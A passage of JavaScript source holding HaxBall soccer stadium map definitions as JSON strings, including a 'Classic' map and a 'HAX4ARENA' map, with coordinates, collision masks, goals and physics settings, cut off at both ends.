"color" : "B6B6B8" }, /* 207 */ { "x" : -9.183591143467062, "y" : -36.43614468447804, "cMask" : [ ], "color" : "B6B6B8" }, /* 208 */ { "x" : 16.22878188132968, "y" : -36.43614468447804, "cMask" : [ ], "color" : "B6B6B8" }, /* 209 */ { "x" : -9.183591143467062, "y" : -34.98400908306107, "cMask" : [ ], "color" : "B6B6B8" }, /* 210 */ { "x" : 16.954849682038155, "y" : -34.98400908306107, "cMask" : [ ], "color" : "B6B6B8" }, /* 211 */ { "x" : -9.183591143467062, "y" : -33.53187348164412, "cMask" : [ ], "color" : "B6B6B8" }, /* 212 */ { "x" : 17.680917482746633, "y" : -33.53187348164412, "cMask" : [ ], "color" : "B6B6B8" }, /* 213 */ { "x" : -9.183591143467062, "y" : -32.07973788022716, "cMask" : [ ], "color" : "B6B6B8" }, /* 214 */ { "x" : 18.40698528345511, "y" : -32.07973788022716, "cMask" : [ ], "color" : "B6B6B8" }, /* 215 */ { "x" : -9.183591143467062, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 216 */ { "x" : 19.133053084163592, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 217 */ { "x" : -9.183591143467062, "y" : -29.17546667739325, "cMask" : [ ], "color" : "B6B6B8" }, /* 218 */ { "x" : 19.859120884872066, "y" : -29.17546667739325, "cMask" : [ ], "color" : "B6B6B8" }, /* 219 */ { "x" : -9.183591143467062, "y" : -27.72333107597629, "cMask" : [ ], "color" : "B6B6B8" }, /* 220 */ { "x" : 20.585188685580544, "y" : -27.72333107597629, "cMask" : [ ], "color" : "B6B6B8" }, /* 221 */ { "x" : 0, "y" : -100, "cMask" : ["red","blue" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180, "cGroup" : ["blueKO" ] }, /* 222 */ { "x" : 0, "y" : 100, "cMask" : ["red","blue" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180, "cGroup" : ["blueKO" ] }, /* 223 */ { "x" : 0, "y" : -100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 224 */ { "x" : 0, "y" : 100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 225 */ { "x" : 0, "y" : -100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 226 */ { "x" : 0, "y" : 100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 227 */ { "x" : 0, "y" : -100, "cMask" : ["red","blue" ], "color" : "B6B6B8", "cGroup" : ["redKO" ], "curve" : 180 }, /* 228 */ { "x" : 0, "y" : 100, "cMask" : ["red","blue" ], "color" : "B6B6B8", "cGroup" : ["redKO" ], "curve" : 180 }, /* 229 */ { "x" : 0, "y" : -100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 230 */ { "x" : 0, "y" : 100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 231 */ { "x" : 0, "y" : -100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 232 */ { "x" : 0, "y" : 100, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 } ], "segments" : [ { "v0" : 0, "v1" : 1, "cMask" : [ ], "color" : "FFCCCC" }, { "v0" : 0, "v1" : 2, "bias" : 3, "bCoef" : 0.1, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 4, "v1" : 3, "bias" : 3, "bCoef" : 0.1, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 5, "v1" : 1, "bias" : 3, "bCoef" : 0.1, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 4, "v1" : 2, "bias" : -3, "bCoef" : 0.1, "curve" : 89.99999999999999, "curveF" : 1.0000000000000002, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 5, "v1" : 3, "bias" : -3, "bCoef" : 0.1, "curve" : 89.99999999999999, "curveF" : 1.0000000000000002, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 7, "v1" : 6, "cMask" : [ ], "color" : "CCCCFF" }, { "v0" : 8, "v1" : 6, "bias" : 3, "bCoef" : 0.1, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 9, "v1" : 10, "bias" : 3, "bCoef" : 0.1, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 7, "v1" : 11, "bias" : 3, "bCoef" : 0.1, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 8, "v1" : 10, "bias" : -3, "bCoef" : 0.1, "curve" : 89.99999999999999, "curveF" : 1.0000000000000002, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 9, "v1" : 11, "bias" : -3, "bCoef" : 0.1, "curve" : 89.99999999999999, "curveF" : 1.0000000000000002, "cMask" : ["ball" ], "color" : "F5072F" }, { "v0" : 12, "v1" : 13, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 14, "v1" : 15, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 16, "v1" : 17, "bCoef" : 0.1, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ], "color" : "B6B6B8" }, { "v0" : 16, "v1" : 18, "bCoef" : 0.1, "vis" : false, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ], "color" : "737573" }, { "v0" : 222, "v1" : 221, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["red","blue" ], "cGroup" : ["blueKO" ], "color" : "B6B6B8" }, { "v0" : 224, "v1" : 223, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["wall" ], "color" : "B6B6B8" }, { "v0" : 226, "v1" : 225, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["wall" ], "color" : "B6B6B8" }, { "v0" : 21, "v1" : 20, "bias" : 99, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 20, "v1" : 0, "bias" : 99, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 1, "v1" : 22, "bias" : 99, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 23, "v1" : 19, "bCoef" : 0.1, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ], "color" : "B6B6B8" }, { "v0" : 23, "v1" : 24, "bCoef" : 0.1, "vis" : false, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ], "color" : "737573" }, { "v0" : 227, "v1" : 228, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["red","blue" ], "cGroup" : ["redKO" ], "color" : "B6B6B8" }, { "v0" : 229, "v1" : 230, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["wall" ], "color" : "B6B6B8" }, { "v0" : 231, "v1" : 232, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["wall" ], "color" : "B6B6B8" }, { "v0" : 22, "v1" : 25, "bias" : 99, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 6, "v1" : 21, "bias" : 99, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 25, "v1" : 7, "bias" : 99, "cMask" : ["ball" ], "color" : "FFFFFF" }, { "v0" : 26, "v1" : 27, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 28, "v1" : 29, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 30, "v1" : 31, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 32, "v1" : 33, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 34, "v1" : 35, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 36, "v1" : 37, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 38, "v1" : 39, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 40, "v1" : 41, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 42, "v1" : 43, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 44, "v1" : 45, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 46, "v1" : 47, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 48, "v1" : 49, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 50, "v1" : 51, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 52, "v1" : 53, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 54, "v1" : 55, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 56, "v1" : 57, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 58, "v1" : 59, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 59, "v1" : 60, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 60, "v1" : 61, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 61, "v1" : 62, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 62, "v1" : 58, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 63, "v1" : 64, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 64, "v1" : 65, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 65, "v1" : 66, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 67, "v1" : 68, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 68, "v1" : 69, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 69, "v1" : 70, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 70, "v1" : 67, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 69, "v1" : 71, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 71, "v1" : 72, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 73, "v1" : 74, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 74, "v1" : 75, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 75, "v1" : 76, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 90 }, { "v0" : 76, "v1" : 77, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 79, "v1" : 80, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 80, "v1" : 81, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 81, "v1" : 78, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 120 }, { "v0" : 82, "v1" : 83, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 83, "v1" : 84, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 84, "v1" : 85, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 85, "v1" : 86, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 86, "v1" : 87, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 87, "v1" : 88, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 88, "v1" : 82, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 89, "v1" : 90, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 90, "v1" : 91, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 91, "v1" : 92, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 92, "v1" : 93, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 93, "v1" : 94, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 94, "v1" : 95, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 95, "v1" : 85, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 63, "v1" : 96, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 35 }, { "v0" : 66, "v1" : 96, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 40 }, { "v0" : 97, "v1" : 98, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 99, "v1" : 100, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 101, "v1" : 102, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 103, "v1" : 104, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 105, "v1" : 106, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 107, "v1" : 108, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 109, "v1" : 110, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 111, "v1" : 112, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 113, "v1" : 114, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 115, "v1" : 116, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 117, "v1" : 118, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 119, "v1" : 120, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 121, "v1" : 122, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 123, "v1" : 124, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 125, "v1" : 126, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 127, "v1" : 128, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 129, "v1" : 130, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 131, "v1" : 132, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 133, "v1" : 134, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 135, "v1" : 136, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 137, "v1" : 138, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 139, "v1" : 140, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 141, "v1" : 142, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 143, "v1" : 144, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 145, "v1" : 146, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 147, "v1" : 148, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 149, "v1" : 150, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 151, "v1" : 152, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 153, "v1" : 154, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 155, "v1" : 156, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 157, "v1" : 158, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 159, "v1" : 160, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 161, "v1" : 162, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 163, "v1" : 164, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 165, "v1" : 166, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 167, "v1" : 168, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 169, "v1" : 170, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 171, "v1" : 172, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 30.5 }, { "v0" : 173, "v1" : 174, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 30.5 }, { "v0" : 175, "v1" : 176, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 39.181884674082816 }, { "v0" : 177, "v1" : 178, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 33.147490369972004 }, { "v0" : 179, "v1" : 180, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 30.86073135771021 }, { "v0" : 181, "v1" : 182, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 35.19051396221234 }, { "v0" : 183, "v1" : 184, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 33.147490369972004 }, { "v0" : 185, "v1" : 186, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 23.18828044702916 }, { "v0" : 187, "v1" : 188, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 74.35999658908567 }, { "v0" : 189, "v1" : 190, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 16.4540974994641 }, { "v0" : 191, "v1" : 192, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 16.908293850310912 }, { "v0" : 193, "v1" : 194, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -0.8470831489067162 }, { "v0" : 195, "v1" : 196, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -18.2525990617023 }, { "v0" : 197, "v1" : 198, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 23.18828044702916 }, { "v0" : 199, "v1" : 200, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 3.434732992799685 }, { "v0" : 201, "v1" : 202, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 203, "v1" : 204, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 205, "v1" : 206, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 207, "v1" : 208, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 209, "v1" : 210, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 211, "v1" : 212, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 213, "v1" : 214, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 215, "v1" : 216, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 217, "v1" : 218, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 219, "v1" : 220, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 95, "v1" : 182, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 95, "v1" : 180, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 5.1503946672979835 }, { "v0" : 95, "v1" : 180, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 50 }, { "v0" : 75, "v1" : 186, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -63.384007741436164 }, { "v0" : 75, "v1" : 190, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -58.93414564563431 }, { "v0" : 75, "v1" : 77, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -63.67867690950191 }, { "v0" : 190, "v1" : 202, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 30.35408736274531 }, { "v0" : 190, "v1" : 204, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 38.71906519735212 }, { "v0" : 190, "v1" : 206, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 40.1697553109201 }, { "v0" : 190, "v1" : 208, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 190, "v1" : 210, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 190, "v1" : 212, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 58.83648077641912 }, { "v0" : 190, "v1" : 214, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 190, "v1" : 216, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 190, "v1" : 218, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 66.76949146697507 }, { "v0" : 190, "v1" : 220, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -15.362643708078915 }, { "v0" : 186, "v1" : 76, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" } ], "planes" : [ { "normal" : [0,1 ], "dist" : -350, "bCoef" : 0.1 }, { "normal" : [-1,0 ], "dist" : -770, "bCoef" : 0.1, "_selected" : true }, { "normal" : [0,-1 ], "dist" : -320, "cMask" : ["ball" ] }, { "normal" : [0,-1 ], "dist" : -350, "bCoef" : 0.1 }, { "normal" : [1,0 ], "dist" : -770, "bCoef" : 0.1 }, { "normal" : [0,1 ], "dist" : -320, "cMask" : ["ball" ] } ], "goals" : [ { "p0" : [-706.25,-85 ], "p1" : [-706.25,85 ], "team" : "red" }, { "p0" : [706.25,-85 ], "p1" : [706.25,85 ], "team" : "blue" } ], "discs" : [ { "pos" : [0,0 ], "radius" : 6.25, "bCoef" : 0.4, "invMass" : 1.5, "cGroup" : ["ball","kick","score" ], "color" : "FFCC00" }, { "pos" : [-700,-85 ], "radius" : 5.5, "invMass" : 0, "color" : "FF0000" }, { "pos" : [-700,85 ], "radius" : 5.5, "invMass" : 0, "color" : "FF0000" }, { "pos" : [700,-85 ], "radius" : 5.5, "invMass" : 0, "color" : "0022FD" }, { "pos" : [700,85 ], "radius" : 5.5, "invMass" : 0, "color" : "0022FD" }, { "pos" : [-700,320 ], "radius" : 3, "bCoef" : 0.1, "invMass" : 0, "color" : "FFCC00", "cMask" : [ ] }, { "pos" : [-700,-320 ], "radius" : 3, "bCoef" : 0.1, "invMass" : 0, "color" : "FFCC00", "cMask" : [ ] }, { "pos" : [700,-320 ], "radius" : 3, "bCoef" : 0.1, "invMass" : 0, "color" : "FFCC00", "cMask" : [ ] }, { "pos" : [700,320 ], "radius" : 3, "bCoef" : 0.1, "invMass" : 0, "color" : "FFCC00", "cMask" : [ ] } ], "playerPhysics" : { "bCoef" : 0.1, "acceleration" : 0.11, "kickingAcceleration" : 0.083 }, "ballPhysics" : "disc0", "traits" : { } }';

var classic = '{ "name" : "Classic", "width" : 420, "height" : 200, "spawnDistance" : 170, "bg" : { "type" : "grass", "width" : 370, "height" : 170, "kickOffRadius" : 75, "cornerRadius" : 0 }, "vertexes" : [ { "x" : -370, "y" : 170, "trait" : "ballArea" }, { "x" : -370, "y" : 64, "trait" : "ballArea" }, { "x" : -370, "y" : -64, "trait" : "ballArea" }, { "x" : -370, "y" : -170, "trait" : "ballArea" }, { "x" : 370, "y" : 170, "trait" : "ballArea" }, { "x" : 370, "y" : 64, "trait" : "ballArea" }, { "x" : 370, "y" : -64, "trait" : "ballArea" }, { "x" : 370, "y" : -170, "trait" : "ballArea" }, { "x" : 0, "y" : 200, "trait" : "kickOffBarrier" }, { "x" : 0, "y" : 75, "trait" : "kickOffBarrier" }, { "x" : 0, "y" : -75, "trait" : "kickOffBarrier" }, { "x" : 0, "y" : -200, "trait" : "kickOffBarrier" }, { "x" : -380, "y" : -64, "trait" : "goalNet" }, { "x" : -400, "y" : -44, "trait" : "goalNet" }, { "x" : -400, "y" : 44, "trait" : "goalNet" }, { "x" : -380, "y" : 64, "trait" : "goalNet" }, { "x" : 380, "y" : -64, "trait" : "goalNet" }, { "x" : 400, "y" : -44, "trait" : "goalNet" }, { "x" : 400, "y" : 44, "trait" : "goalNet" }, { "x" : 380, "y" : 64, "trait" : "goalNet" } ], "segments" : [ { "v0" : 0, "v1" : 1, "trait" : "ballArea" }, { "v0" : 2, "v1" : 3, "trait" : "ballArea" }, { "v0" : 4, "v1" : 5, "trait" : "ballArea" }, { "v0" : 6, "v1" : 7, "trait" : "ballArea" }, { "v0" : 12, "v1" : 13, "trait" : "goalNet", "curve" : -90 }, { "v0" : 13, "v1" : 14, "trait" : "goalNet" }, { "v0" : 14, "v1" : 15, "trait" : "goalNet", "curve" : -90 }, { "v0" : 16, "v1" : 17, "trait" : "goalNet", "curve" : 90 }, { "v0" : 17, "v1" : 18, "trait" : "goalNet" }, { "v0" : 18, "v1" : 19, "trait" : "goalNet", "curve" : 90 }, { "v0" : 8, "v1" : 9, "trait" : "kickOffBarrier" }, { "v0" : 9, "v1" : 10, "trait" : "kickOffBarrier", "curve" : 180, "cGroup" : ["blueKO"] }, { "v0" : 9, "v1" : 10, "trait" : "kickOffBarrier", "curve" : -180, "cGroup" : ["redKO"] }, { "v0" : 10, "v1" : 11, "trait" : "kickOffBarrier" } ], "goals" : [ { "p0" : [-370, 64], "p1" : [-370,-64], "team" : "red" }, { "p0" : [370, 64], "p1" : [370,-64], "team" : "blue" } ], "discs" : [ { "pos" : [-370, 64], "trait" : "goalPost", "color" : "FFCCCC" }, { "pos" : [-370, -64], "trait" : "goalPost", "color" : "FFCCCC" }, { "pos" : [ 370, 64], "trait" : "goalPost", "color" : "CCCCFF" }, { "pos" : [ 370, -64], "trait" : "goalPost", "color" : "CCCCFF" } ], "planes" : [ { "normal" : [0, 1], "dist" : -170, "trait" : "ballArea" }, { "normal" : [0,-1], "dist" : -170, "trait" : "ballArea" }, { "normal" : [ 0, 1], "dist" : -200, "bCoef" : 0.1 }, { "normal" : [ 0,-1], "dist" : -200, "bCoef" : 0.1 }, { "normal" : [ 1, 0], "dist" : -420, "bCoef" : 0.1 }, { "normal" : [-1, 0], "dist" : -420, "bCoef" : 0.1 } ], "traits" : { "ballArea" : { "vis" : false, "bCoef" : 1, "cMask" : ["ball"] }, "goalPost" : { "radius" : 8, "invMass" : 0, "bCoef" : 0.5 }, "goalNet" : { "vis" : true, "bCoef" : 0.1, "cMask" : ["ball"] }, "kickOffBarrier" : { "vis" : false, "bCoef" : 0.1, "cGroup" : ["redKO", "blueKO"], "cMask" : ["red", "blue"] } } }'

var getRealSoccerMap = '{"name":"HAX4ARENA","width":1300,"height":670,"spawnDistance":560,"bg":{"type":"grass","width":1150,"height":600,"kickOffRadius":180,"cornerRadius":0,"color":"`+mapBGColor+`"},"playerPhysics":{"bCoef":0.3,"invMass":0.5,"damping":0.96,"acceleration":0.12,"kickingAcceleration":0.07,"kickingDamping":0.96,"kickStrength":5.65},"ballPhysics":{"radius":9,"bCoef":0.5,"invMass":1.05,"damping":0.99,"color":"FFFFFF","cMask":["all"],"cGroup":["ball"]},"vertexes":[{"x":0,"y":675,"trait":"kickOffBarrier"},{"x":0,"y":180,"trait":"kickOffBarrier"},{"x":0,"y":-180,"trait":"kickOffBarrier"},{"x":0,"y":-675,"trait":"kickOffBarrier"},{"x":1150,"y":320,"trait":"line"},{"x":840,"y":320,"trait":"line"},{"x":1150,"y":-320,"trait":"line"},{"x":840,"y":-320,"trait":"line"},{"x":1150,"y":180,"trait":"line"},{"x":1030,"y":180,"trait":"line"},{"x":1150,"y":-180,"trait":"line"},{"x":1030,"y":-180,"trait":"line"},{"x":840,"y":-130,"trait":"line","curve":-130},{"x":840,"y":130,"trait":"line","curve":-130},{"x":-1150,"y":-320,"trait":"line"},{"x":-840,"y":-320,"trait":"line"},{"x":-1150,"y":320,"trait":"line"},{"x":-840,"y":320,"trait":"line"},{"x":-1150,"y":-175,"trait":"line"},{"x":-1030,"y":-175,"trait":"line"},{"x":-1150,"y":175,"trait":"line"},{"x":-1030,"y":175,"trait":"line"},{"x":-840,"y":130,"trait":"line","curve":-130},{"x":-840,"y":-130,"trait":"line","curve":-130},{"x":935,"y":3,"trait":"line"},{"x":935,"y":-3,"trait":"line"},{"x":-935,"y":3,"trait":"line"},{"x":-935,"y":-3,"trait":"line"},{"x":-1150,"y":570,"bCoef":-2.65,"cMask":["ball"],"cGroup":["c0"],"trait":"line"},{"x":-1120,"y":600,"bCoef":-2.65,"cMask":["ball"],"cGroup":["c0"],"trait":"line"},{"x":-1120,"y":-600,"bCoef":-2.